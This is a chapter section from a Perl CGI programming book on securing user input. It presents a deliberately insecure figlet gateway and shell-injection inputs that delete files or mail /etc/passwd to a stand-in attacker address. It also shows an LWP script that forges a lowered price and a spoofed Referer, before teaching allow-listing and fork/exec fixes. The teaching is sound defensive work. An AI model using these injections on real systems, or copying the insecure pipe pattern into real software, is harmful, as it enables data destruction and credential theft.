@@ -1,0 +1,622 @@
+<?label 8.2. Handling User Input?><html><head><title>Handling User Input (CGI Programming with Perl)</title><link href="../style/style1.css" type="text/css" rel="stylesheet" />
+
+<meta name="DC.Creator" content="Scott Guelich, Gunther Birznieks and Shishir Gundavaram" /><meta scheme="MIME" content="text/xml" name="DC.Format" /><meta content="en-US" name="DC.Language" /><meta content="O'Reilly & Associates, Inc." name="DC.Publisher" /><meta scheme="ISBN" name="DC.Source" content="1565924193L" /><meta name="DC.Subject.Keyword" content="stuff" /><meta name="DC.Title" content="CGI Programming with Perl" /><meta content="Text.Monograph" name="DC.Type" />
+
+</head><body bgcolor="#ffffff">
+
+<img src="gifs/smbanner.gif" alt="Book Home" usemap="#banner-map" border="0" /><map name="banner-map"><area alt="CGI Programming with Perl" href="index.htm" coords="0,0,466,65" shape="rect" /><area alt="Search this book" href="jobjects/fsearch.htm" coords="467,0,514,18" shape="rect" /></map>
+
+<div class="navbar"><table border="0" width="515"><tr><td width="172" valign="top" align="left"><a href="ch08_01.htm"><img src="../gifs/txtpreva.gif" alt="Previous" border="0" /></a></td><td width="171" valign="top" align="center"><a href="index.htm">CGI Programming with Perl</a></td><td width="172" valign="top" align="right"><a href="ch08_03.htm"><img src="../gifs/txtnexta.gif" alt="Next" border="0" /></a></td></tr></table></div>
+<hr align="left" width="515" />
+
+
+<h2 class="sect1">8.2. Handling User Input</h2>
+
+
+<p>Security problems<a name="INDEX-1670" /> <a name="INDEX-1,671" />
+<a name="INDEX-1672" /> <a name="INDEX-1,673" /> arise when you make assumptions about
+your data: you assume that users will do what you expect, and they
+surprise you. Users are good at this, even when they're not
+trying. To write secure CGI scripts, you must also think creatively.
+Let's look at an example.</p>
+
+
+<a name="ch08-1-fm2xml" /><div class="sect2">
+<h3 class="sect2">8.2.1. Calling External Applications</h3>
+
+
+<p><tt class="command">figlet</tt>
+<a name="INDEX-1674" /> <a name="INDEX-1,675" />
+<a name="INDEX-1676" /> is a
+fun application that allows us to create large, fancy ASCII art
+characters in many different sizes and styles. You can find examples
+of <em class="emphasis">figlet</em> output as part of people's
+signatures in email messages and newsgroup posts. If
+<em class="emphasis">figlet</em> is not on your system, you can get it
+from <a href="http://st-www.cs.uiuc.edu/users/chai/figlet.html">http://st-www.cs.uiuc.edu/users/chai/figlet.html</a>.</p>
+
+
+<p>You can execute <tt class="command">figlet</tt> from the command line in
+the following manner:</p>
+
+
+<blockquote><pre class="code">$ figlet -f fonts/slant 'I Love CGI!'</pre></blockquote>
+
+
+<p>And the output would be:</p>
+
+
+<blockquote><pre class="code">____   __                       ______________________
+   /  _/  / /   ____ _   _____     / ____/ __  _  _/  _/ /
+   / /   / /   / _  _ \ | / / _ \   / /   / / _  _ / // /
+ _/ /   / /___/ /_/ / |/ /  __/  / /_  _  _/ /_/ // //_/
+/___/  /_____/\____/|___/\___/   \____/\____/_  _  _(_)</pre></blockquote>
+
+
+<p>We can write a CGI gateway to <tt class="command">figlet</tt> that allows a
+user to enter some text, executes a command like the one shown above,
+captures the output, and returns it to the browser.</p>
+
+
+<p>First, <a href="ch08_02.htm#ch08-87350">Example 8-1</a> shows the
+<a name="INDEX-1677" />HTML form.</p>
+
+
+
+<a name="ch08-87350" /><div class="example">
+<h4 class="objtitle">Example 8-1. figlet.html </h4>
+
+<blockquote><pre class="code">&lt;html&gt;
+  &lt;head&gt;
+    &lt;title&gt;Figlet Gateway&lt;/title&gt;
+  &lt;/head&gt;
+  
+  &lt;body bgcolor="#FFFFFF"&gt;
+    
+    &lt;div align="center"&gt;
+    &lt;h2&gt;Figlet Gateway&lt;/h2&gt;
+    
+    &lt;form action="/cgi/unsafe/figlet_INSECURE.cgi" method="GET"&gt;
+      &lt;p&gt;Please enter a string to pass to figlet:
+        &lt;input type="text" name="string"&gt;&lt;/p&gt;
+      &lt;input type="submit"&gt;
+    &lt;/form&gt;
+  
+  &lt;/body&gt;
+&lt;/html&gt;</pre></blockquote>
+</div>
+
+
+<p>Now, <a href="ch08_02.htm#ch08-67876">Example 8-2</a> shows the program.</p>
+
+
+
+<a name="ch08-67876" /><div class="example">
+<h4 class="objtitle">Example 8-2. figlet_INSECURE.cgi </h4>
+<a name="INDEX-1678" />
+
+<blockquote><pre class="code">#!/usr/bin/perl -w
+
+use strict;
+use CGI;
+use CGIBook::Error;
+
+# Constant: path to figlet
+my $FIGLET = '/usr/local/bin/figlet';
+
+my $q      = new CGI;
+my $string = $q-&gt;param( "string" );
+
+unless ( $string ) {
+    error( $q, "Please enter some text to display." );
+}
+
+local *PIPE;
+
+## This code is INSECURE...
+## Do NOT use this code on a live web server!!
+open PIPE, "$FIGLET \"$string\" |" or
+    die "Cannot open pipe to figlet: $!";
+
+print $q-&gt;header( "text/plain" );
+print while &lt;PIPE&gt;;
+close PIPE;</pre></blockquote>
+</div>
+
+
+<p>We first verify that the user entered a string and simply print an
+error if not. Then we open a
+<a name="INDEX-1679" />
+<a name="INDEX-1680" />pipe (notice the trailing
+"|"character) to the <tt class="command">figlet</tt> command,
+passing it the string. By opening a pipe to another application, we
+can read from it as though it is a file. In this case, we can get at
+the <tt class="command">figlet</tt> output by simply reading from the PIPE
+file handle.</p>
+
+
+<p>We then print our content type, followed by the
+<tt class="command">figlet</tt> output. Perl lets us do this on one line:
+the <tt class="function">while</tt> loop reads a line from PIPE, stores it
+in <tt class="literal">$_</tt>, and calls <em class="emphasis">print</em>;
+when <em class="emphasis">print</em> is called without an argument, it
+will output the value stored in <tt class="literal">$_</tt>; the loop
+automatically terminates when all the data has been read from
+<tt class="command">figlet</tt>.</p>
+
+
+<p>Admittedly, our example is somewhat dull. <tt class="command">figlet</tt>
+has many options for changing the font, etc., but we want to keep our
+example short and simple to be able to focus on the security issues.
+Many people assume that it's hard for something to go wrong
+with scripts this simple. In fact, this CGI script allows a savvy
+user to execute <em class="emphasis">any</em> command on your system!</p>
+
+
+<p>Before reading further, see if you can figure out how this example is
+insecure. Remember that your commands are executed with the same
+permissions that your web server runs as (e.g.,
+<em class="emphasis">nobody</em>). If you want to test it on a web server,
+then only do so on a private web server that is
+<em class="emphasis">not</em> attached to the Internet! Finally, try to
+figure out how to fix this security problem.</p>
+
+
+<p>The reason why we suggest that you try to find the solution yourself
+is that there are many possible solutions that appear secure but are
+not. Before we look at the solutions, let's analyze the
+problem. It should have been pretty obvious (if only from the
+comments in the code), that the culprit is the call that opens a pipe
+to <tt class="command">figlet</tt>. Why is this insecure? Well, it
+isn't if the user does in fact pass simple words without
+punctuation. But if you assume this then you would be forgetting our
+rule: never trust any data from the user.</p>
+</div>
+
+
+
+
+<a name="ch08-2-fm2xml" /><div class="sect2">
+<h3 class="sect2">8.2.2. User Input and the Shell</h3>
+
+
+<p>You should not assume this field will contain harmless data. It could
+be anything. When Perl opens a
+<a name="INDEX-1681" /> <a name="INDEX-1,682" />pipe to an external program, it
+passes the command through a
+<a name="INDEX-1683" />
+<a name="INDEX-1684" />shell.
+Suppose the input were the text:</p>
+
+
+<blockquote><pre class="code">`rm -rf /`</pre></blockquote>
+
+
+<p>or:</p>
+
+
+<blockquote><pre class="code">"; mail cracker@badguys.net &lt;/etc/passwd"</pre></blockquote>
+
+
+<p>These commands would execute as if the following commands had been
+entered into a shell:</p>
+
+
+<blockquote><pre class="code">$ /usr/local/bin/figlet "`rm -rf /`"
+$ /usr/local/bin/figlet ""; mail cracker@badguys.net &lt;/etc/passwd</pre></blockquote>
+
+
+<p>The first command would attempt to erase every file on your server,
+leaving you to search for your backup tapes.<a href="#FOOTNOTE-13">[13]</a> The second would
+email your system password file to someone you'd probably
+rather not have trying to log into your system. Windows servers are
+no better off; the input <tt class="literal">"| del /f /s /q c:\"</tt>
+would be just as catastrophic.</p><blockquote>
+
+<a name="FOOTNOTE-13" /><p>[13]This
+example shows you why it is important to create a special user like
+<em class="emphasis">nobody</em> to run your web server and why this user
+should own as few files as possible. See <a href="ch01_01.htm">Chapter 1, "Getting Started "</a></p>
+
+</blockquote>
+
+
+<p>So what should we do? Well, the main problem is that the shell gives
+many <a name="INDEX-1685" />
+<a name="INDEX-1686" />characters special meaning. For
+example, the backtick character (<tt class="literal">`</tt>) allows you to
+embed one command inside another. This makes the shell powerful, but
+in this context, that power is dangerous. We could attempt to make a
+list of all the special characters. We would need to include all the
+characters that can cause other commands to run, that change the
+environment in significant ways, or terminate our intended commands
+and allow another command to follow.</p>
+
+
+<p>We could change the code as follows:</p>
+
+
+<blockquote><pre class="code">my $q      = new CGI;
+my $string = $q-&gt;param( "string" );
+unless ( $string ) {
+    error( $q, "Please enter some text to display." );
+}
+
+## This is an incomplete example; this is NOT a secure check
+if ( $string =~ /[`\$\\"';&amp; ...  ] ) {
+    error( $q,
+        "Your text may not include these characters: `\$\\\"';&amp; ..." );
+}</pre></blockquote>
+
+
+<p>This example is not complete, and we will not provide a full list of
+dangerous characters here. We won't create such a list because
+we do not trust that we will not miss something important, and that
+is why this is the wrong way to go about solving the problem. This
+solution requires you to know every possible way that the shell can
+execute a dangerous command. If you miss just one thing, you can be
+compromised.</p>
+</div>
+
+
+
+
+<a name="ch08-3-fm2xml" /><div class="sect2">
+<h3 class="sect2">8.2.3. Security Strategies</h3>
+
+
+<p>The <a name="INDEX-1687" />right
+way is not to make a list of what to disallow. The right way is to
+make a list of what to allow. This makes the solution much more
+manageable. If you start by saying that anything goes and looking for
+those things that cause problems, you will spend a long time looking.
+There are countless combinations to check. If you say that nothing
+goes and then slowly add things, you can check each of these as you
+add them and confirm that nothing will slip past you. If you miss
+something, you have disallowed something you should allow, and you
+can correct the problem by testing it and adding it. This is a much
+safer way to error.</p>
+
+
+<p>The final reason why this is the safer way to go is that security
+solutions should be simple. It's never a good idea to simply
+trust someone else who provides you a "definitive" list
+of something as important as dangerous shell characters to check
+against. You are the one who is accountable for your code, so you
+should fully understand why and how your code works, and not place
+blind faith in others.</p>
+
+
+<p>So let's make a
+<a name="INDEX-1688" />list of things to allow. We will allow
+letters, numbers, underscores, spaces, hyphens, periods, question
+marks, and exclamation points. That's a lot, and it should
+cover most of the strings that users try to convert. Let's also
+switch to <a name="INDEX-1689" />single quotes around the argument
+to make things even safer. <a href="ch08_02.htm#ch08-83626">Example 8-3</a> provides a
+more secure version of our CGI script.</p>
+
+
+
+<a name="ch08-83626" /><div class="example">
+<h4 class="objtitle">Example 8-3. figlet_INSECURE2.cgi </h4>
+<a name="INDEX-1690" />
+
+<blockquote><pre class="code">#!/usr/bin/perl -w
+
+use strict;
+use CGI;
+use CGIBook::Error;
+
+my $FIGLET = '/usr/local/bin/figlet';
+
+my $q      = new CGI;
+my $string = $q-&gt;param( "string" );
+
+unless ( $string ) {
+    error( $q, "Please enter some text to display." );
+}
+
+unless ( $string =~ /^[\w .!?-]+$/ ) {
+    error( $q, "You entered an invalid character. " .
+               "You may only enter letters, numbers, " .
+               "underscores, spaces, periods, exclamation " .
+               "points, question marks, and hyphens." );
+}
+local *PIPE;
+
+## This code is more secure, but still dangerous...
+## Do NOT use this code on a live web server!!
+open PIPE, "$FIGLET '$string' |" or
+    die "Cannot open figlet: $!";
+
+print $q-&gt;header( "text/plain" );
+print while &lt;PIPE&gt;;
+close PIPE;</pre></blockquote>
+</div>
+
+
+<p>This code is much better. It isn't dangerous in its current
+form. The only problem is that someone can come along at some later
+point and make minor changes that could render the script insecure
+again. Of course, we can't cover every possibility  -- we
+have to draw the line somewhere. So are we being too critical to say
+the script could be more secure? Perhaps, but it always best to be
+safer rather than sorry when dealing with web security. We can
+improve this script because there is a way to open a pipe to another
+process in Perl and bypass the shell altogether. All right, you say,
+so why didn't we say so in the first place? Unfortunately, this
+trick only works on those <a name="INDEX-1691" />operating systems where
+<a name="INDEX-1692" />Perl can
+<tt class="function">fork</tt>, so this does not work on Win32<a href="#FOOTNOTE-14">[14]</a> or MacOS, for example.</p><blockquote>
+
+<a name="FOOTNOTE-14" /><p>[14]As this book was going to press, the most recent versions of
+ActiveState Perl supported <tt class="function">fork </tt>on Win32.</p>
+
+</blockquote>
+</div>
+
+
+
+
+<a name="ch08-4-fm2xml" /><div class="sect2">
+<h3 class="sect2">8.2.4. fork and exec</h3>
+
+
+<p>All we need to do is replace the command that opens the
+<a name="INDEX-1693" />
+<a name="INDEX-1694" />
+<a name="INDEX-1695" />pipe with the
+following lines:</p>
+
+
+<blockquote><pre class="code">## Ahh, much safer
+my $pid = open PIPE, "-|";
+die "Cannot fork $!" unless defined $pid;
+
+unless ( $pid ) {
+    exec FIGLET, $string or die "Cannot open pipe to figlet: $!";
+}</pre></blockquote>
+
+
+<p>This uses a special form of the
+<tt class="function">open</tt>
+<a name="INDEX-1696" /> function, which implicitly tells Perl to
+fork and create a <a name="INDEX-1697" />
+<a name="INDEX-1698" />child process with a pipe connected
+to it. The child process is a copy of the current executing script
+and continues from the same point. However, <tt class="function">open</tt>
+returns a different value for each of the forked processes: the
+parent receives the <em class="firstterm">process
+identifier</em>
+<a name="INDEX-1699" /> (<em class="firstterm">PID</em>) of the child
+process; the child process receives <tt class="literal">0</tt>. If open
+fails to fork, it returns <tt class="literal">undef</tt>.</p>
+
+
+<p>After verifying that the command succeeded, the child process calls
+<tt class="function">exec</tt> to run <tt class="command">figlet</tt>.
+<tt class="function">exec</tt> tells Perl to replace the child process
+with <tt class="command">figlet</tt>, while keeping the same environment
+including the pipe to the <a name="INDEX-1700" />
+<a name="INDEX-1701" />parent process. Thus, the child
+process becomes <tt class="command">figlet</tt> and the parent keeps a pipe
+to <tt class="command">figlet</tt>, just as if it had used the simpler
+<tt class="function">open</tt> command from above.</p>
+
+
+<p>This is obviously a little more complicated. So why all this work if
+we still have to call <tt class="command">figlet</tt> from
+<tt class="function">exec</tt>? Well, if you look closely, you'll
+notice that <tt class="function">exec</tt> takes multiple arguments in
+this script. The first argument is the name of the process to run,
+and the remaining arguments are passed as arguments to the new
+process, but Perl does this without passing them through the shell.
+Thus, by making our code a little more complex, we can avoid a big
+security 
+<a name="INDEX-1702" /> <a name="INDEX-1,703" /> <a name="INDEX-1,704" />problem.</p>
+</div>
+
+
+
+
+<a name="ch08-74342" /><div class="sect2">
+<h3 class="sect2">8.2.5. Trusting the Browser</h3>
+
+
+<p>Let's look at another common
+<a name="INDEX-1705" /> <a name="INDEX-1,706" /> <a name="INDEX-1,707" />security mistake in CGI scripts. You may
+think that the only data coming from the user you have to validate is
+the data they are allowed to edit. For example, you might think that
+data embedded in <a name="INDEX-1708" />
+<a name="INDEX-1709" />hidden fields or
+select lists is safer than data in text fields because the browser
+doesn't allow users to edit them. Actually, these can be just
+as dangerous. Let's see why.</p>
+
+
+<p>In this example, we'll look at a simple
+<a name="INDEX-1710" />online software store. Here, each
+product has its own static HTML page and each page calls the same CGI
+script to processes the transaction. In order to make the CGI script
+as flexible as possible, it takes the product name, quantity, and
+price from hidden fields in the product page. It then collects the
+user's credit card information, charges the card for the full
+amount, and allows the user to download the software.</p>
+
+
+<p><a href="ch08_02.htm#ch08-77714">Example 8-4</a> shows a sample product page.</p>
+
+
+
+<a name="ch08-77714" /><div class="example">
+<h4 class="objtitle">Example 8-4. sb3000_INSECURE.html </h4>
+
+<blockquote><pre class="code">&lt;html&gt;
+  &lt;head&gt;
+    &lt;title&gt;Super Blaster 3000&lt;/title&gt;
+  &lt;/head&gt;
+  
+  &lt;body bgcolor="#FFFFFF"&gt;
+    &lt;h2&gt;Super Blaster 3000&lt;/h2&gt;
+    &lt;hr&gt;
+    
+    &lt;form action="https://localhost/cgi/buy.cgi" method="GET"&gt;
+      &lt;input type="hidden" name="price" value="30.00"&gt;
+      &lt;input type="hidden" name="name" value="Super Blaster 3000"&gt;
+      
+      &lt;p&gt;Experience Super Blaster 3000, the hot new game that 
+        everyone is talking about! You can't find it in stores, so
+        order your copy here today. Just a quick download and you 
+        can be playing it all night!&lt;/p&gt;
+      
+      &lt;p&gt;The price is $30.00 (USD) per license. Enter the number
+        of licenses you want, then click the &lt;i&gt;Order&lt;/i&gt; button to 
+        enter your order information.&lt;/p&gt;
+      
+      &lt;p&gt;Number of Licenses: 
+        &lt;input type="text" name="quantity" value="1" size="8"&gt;&lt;/p&gt;
+      &lt;input type="submit" name="submit" value="Order"&gt;
+      
+    &lt;/form&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</pre></blockquote>
+</div>
+
+
+<p>We don't <a name="INDEX-1711" />
+<a name="INDEX-1712" />need to look at the CGI script in this
+example, because the problem isn't what it does, it's how
+it's called. For now, we're interested in the form, and
+the security problem here is the price. The price is in a hidden
+field, so the form should not allow users to change the price. You
+may have noticed, however, that because the form is submitted via
+<a name="INDEX-1713" /> <a name="INDEX-1,714" />GET, the parameters
+will be clearly visible in the URL in your browser window. The
+previous example with one license generates the following URL (ignore
+the line break):</p>
+
+
+<blockquote><pre class="code">https://localhost/cgi/buy.cgi?price=30.00&amp;
+name=Super+Blaster+3000&amp;quantity=1&amp;submit=Order</pre></blockquote>
+
+
+<p>By modifying this URL, it is possible to change the price to anything
+and call the CGI script with this new value.</p>
+
+
+<p>Do not be deceived into thinking that you can solve this problem by
+changing the request method to POST. Many web developers use
+<a name="INDEX-1715" />POST even when it is not appropriate (see
+GET and POST in <a href="ch02_03.htm#ch02-39281">Section 2.3, "Browser Requests"</a>)
+because they believe it makes their scripts more secure against URL
+tampering. This is false security. First of all, CGI.pm, like most
+modules that parse form input, does not differentiate between data
+obtained via POST or GET. Just because you change your form to call
+the script via POST does not mean that the user cannot manually
+construct a query string to call your script via GET instead. To
+prevent this, you could insert code like this:</p>
+
+
+<blockquote><pre class="code">unless ( $ENV{REQUEST_METHOD} eq "POST" ) {
+    error( $q, "Invalid request method." );
+}</pre></blockquote>
+
+
+<p>However, the user can always copy your form to their own system. Then
+they can change the price to be an editable text field in their copy
+of the form and submit it to your CGI. Nothing inherent to HTTP
+prevents an HTML form on one server from calling a CGI script on
+another server. In fact, a CGI script can not reliably determine what
+form was used to submit data to it. Many web developers attempt to
+use the <a name="INDEX-1716" />HTTP_REFERER environment variable to
+check where form input came from. You can do so like this:</p>
+
+
+<blockquote><pre class="code">my $server = quotemeta( $ENV{HTTP_HOST} || $ENV{SERVER_NAME} );
+unless ( $ENV{HTTP_REFERER} =~ m|^https?://$server/| ) {
+    error( $q, "Invalid referring URL." );
+}</pre></blockquote>
+
+
+<p>The problem here is that you have <a name="INDEX-1717" />gone from trusting the user to
+trusting the user's browser. Don't do this. If the user
+is surfing with Netscape or Internet Explorer, you may be okay. It is
+possible that a bug could cause the browser to send the wrong
+referring URL, but this is unlikely. However, whoever said that users
+had to use one of these browsers?</p>
+
+
+<p>There are many web browsers available, and some are far more
+configurable than Netscape and Internet Explorer. Did you know that
+Perl even has its own web client of sorts? The
+<a name="INDEX-1718" />
+<a name="INDEX-1719" />
+<a name="INDEX-1720" /> <a name="INDEX-1,721" />LWP module allows you to
+create and send HTTP requests easily from within Perl. The requests
+are fully customizable, so you can include whatever HTTP headers you
+wish, including <em class="emphasis">Referer</em> and
+<em class="emphasis">User-Agent</em>. The following code would allow
+someone to easily bypass all the security checks we've listed
+earlier:</p>
+
+
+<blockquote><pre class="code">#!/usr/bin/perl -w
+
+use strict;
+
+use LWP::UserAgent;
+use HTTP::Request;
+use HTTP::Headers;
+use CGI;
+
+my $q = new CGI( {
+    price    =&gt; 0.01,
+    name     =&gt; "Super Blaster 3000",
+    quantity =&gt; 1,
+    submit   =&gt; "Order",
+} );
+
+my $form_data = $q-&gt;query_string;
+
+my $headers = new HTTP::Headers(
+    Accept       =&gt; "text/html, text/plain, image/*",
+    Referer      =&gt; "http://localhost/products/sb3000.html",
+    Content_Type =&gt; "application/x-www-form-urlencoded"
+);
+
+my $request = new HTTP::Request(
+    "POST",
+    "http://localhost/cgi/feedback.cgi",
+    $headers
+);
+
+$request-&gt;content( $form_data );
+
+my $agent = new LWP::UserAgent;
+$agent-&gt;agent( "Mozilla/4.5" );
+my $response = $agent-&gt;request( $request );
+
+print $response-&gt;content;</pre></blockquote>
+
+
+<p>We're not going to review how this code works now, although
+we'll discuss LWP in <a href="ch14_01.htm">Chapter 14, "Middleware and XML"</a>. Right now,
+the important thing to understand is that you can't trust any
+data that comes from the user, and you can't trust the browser
+to protect you from the user. It's trivially easy for someone
+with a little knowledge and a little ingenuity to provide you with
+any input they <a name="INDEX-1722" /> <a name="INDEX-1,723" /> <a name="INDEX-1,724" /> <a name="INDEX-1,725" />want.</p>
+</div>
+
+
+<hr align="left" width="515" />
+<div class="navbar"><table border="0" width="515"><tr><td width="172" valign="top" align="left"><a href="ch08_01.htm"><img src="../gifs/txtpreva.gif" alt="Previous" border="0" /></a></td><td width="171" valign="top" align="center"><a href="index.htm"><img src="../gifs/txthome.gif" alt="Home" border="0" /></a></td><td width="172" valign="top" align="right"><a href="ch08_03.htm"><img src="../gifs/txtnexta.gif" alt="Next" border="0" /></a></td></tr><tr><td width="172" valign="top" align="left">8. Security</td><td width="171" valign="top" align="center"><a href="index/index.htm"><img src="../gifs/index.gif" alt="Book Index" border="0" /></a></td><td width="172" valign="top" align="right">8.3. Encryption</td></tr></table></div>
+<hr align="left" width="515" />
+
+<img src="../gifs/navbar.gif" alt="Library Navigation Links" usemap="#library-map" border="0" />
+<p><font size="-1"><a href="copyrght.htm">Copyright &copy; 2001</a> O'Reilly &amp; Associates. All rights reserved.</font></p>
+
+<map name="library-map"><area href="../index.htm" coords="1,1,83,102" shape="rect" /><area href="../lnut/index.htm" coords="81,0,152,95" shape="rect" /><area href="../run/index.htm" coords="172,2,252,105" shape="rect" /><area href="../apache/index.htm" coords="238,2,334,95" shape="rect" /><area href="../sql/index.htm" coords="336,0,412,104" shape="rect" /><area href="../dbi/index.htm" coords="415,0,507,101" shape="rect" /><area href="../cgi/index.htm" coords="511,0,601,99" shape="rect" /></map>
+
+</body></html>
